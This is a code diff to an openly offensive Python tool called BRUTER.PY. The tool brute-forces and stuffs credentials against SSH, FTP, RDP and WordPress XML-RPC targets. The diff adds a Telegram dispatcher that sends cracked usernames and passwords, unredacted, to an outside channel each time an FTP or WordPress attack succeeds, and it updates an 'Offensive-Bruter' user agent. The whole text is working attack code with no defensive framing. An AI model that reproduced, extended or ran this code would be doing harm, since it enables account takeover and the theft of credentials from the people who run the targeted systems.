@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 """
-BRUTER.PY — Active Multi-Protocol Credential Brute-Forcing & Stuffing Engine v7.5
+BRUTER.PY — Active Multi-Protocol Credential Brute-Forcing & Stuffing Engine v8.0 (With Telegram Telemetry)
 Features:
 - High-aggression SSH, FTP, and RDP credential brute-forcing
 - WordPress XML-RPC brute-force amplification attacks
 - Dynamic credential queue ingestion and multi-threaded dispatching
 - Automated immutable disk persistence (loot_output/) via centralized framework logger
+- Real-time asynchronous Telegram notification dispatch for unredacted brute-force credentials & loot
 """
 import asyncio
 import socket
@@ -16,9 +17,10 @@ import xml.etree.ElementTree as ET
 from urllib.parse import urlsplit
 import sys
 
-# Import centralized framework telemetry and immutable loot persistence
+# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
+from modules.telegram_notifier import send_telegram_alert
 
 # ============================================================
 # CONFIGURATION & DEFAULT CREDENTIAL LISTS
@@ -45,7 +47,7 @@ DEFAULT_CREDENTIALS = [
 ]
 
 # ============================================================
-# TERMINAL OUTPUT
+# TERMINAL OUTPUT & TELEGRAM DISPATCHER
 # ============================================================
 class Colors:
     RED = "\033[91m"
@@ -60,6 +62,17 @@ class Colors:
 def log(message, color=Colors.RESET):
     sys.stdout.write(f"{color}{message}{Colors.RESET}\n")
     sys.stdout.flush()
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous bruter functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 # ============================================================
 # TARGET NORMALIZATION
@@ -163,6 +176,16 @@ async def probe_ftp_target(host, port=21, credentials=None):
                 successful_login = True
                 cracked_cred = {"username": username, "password": password}
                 
+                loot_payload = {
+                    "target": f"ftp://{host}:{port}",
+                    "username": username,
+                    "password": password,
+                    "response": pass_resp_text
+                }
+
+                # BROADCAST UNREDACTED CREDENTIAL LOOT STRAIGHT TO TELEGRAM
+                broadcast_tg_alert_sync("FTP Credential Brute-Force Success", loot_payload)
+
                 # STREAM TELEMETRY & PERSIST FTP CRACK TO DISK IMMEDIATELY
                 stream_proof("FTP_CREDENTIAL_CRACKED", f"{host}:{port}", {"username": username}, pass_resp_text, cracked_cred)
                 save_session_loot(
@@ -172,7 +195,7 @@ async def probe_ftp_target(host, port=21, credentials=None):
                     status=230,
                     headers={},
                     body=pass_resp_text,
-                    extra_loot=cracked_cred
+                    extra_loot=loot_payload
                 )
                 break
                 
@@ -283,7 +306,7 @@ async def assault_wordpress_target(host, credentials=None):
             xmlrpc_url,
             data=payload.encode("utf-8"),
             headers={
-                "User-Agent": "BruteDog-Offensive-Bruter/5.1",
+                "User-Agent": "BruteDog-Offensive-Bruter/8.0",
                 "Content-Type": "text/xml",
             },
             method="POST",
@@ -305,6 +328,15 @@ async def assault_wordpress_target(host, credentials=None):
             log(f"\n\033[1m\033[91m[***] WORDPRESS XML-RPC CREDENTIAL STUFFING SUCCESS [***]\033[0m", Colors.RED)
             success = True
             
+            loot_payload = {
+                "xmlrpc_url": xmlrpc_url,
+                "status": status,
+                "response_sample": body[:400]
+            }
+
+            # BROADCAST UNREDACTED WORDPRESS LOOT STRAIGHT TO TELEGRAM
+            broadcast_tg_alert_sync("WordPress XML-RPC Stuffing Success", loot_payload)
+
             # STREAM TELEMETRY & PERSIST WP CRACK TO DISK IMMEDIATELY
             stream_proof("WORDPRESS_XMLRPC_CRACK", xmlrpc_url, {}, body[:300], {"status": status})
             save_session_loot(
@@ -314,7 +346,7 @@ async def assault_wordpress_target(host, credentials=None):
                 status=status,
                 headers={},
                 body=body,
-                extra_loot={"xmlrpc_url": xmlrpc_url}
+                extra_loot=loot_payload
             )
 
     log(f"       [-] XML-RPC Brute-force endpoint returned HTTP {status}", Colors.GRAY)
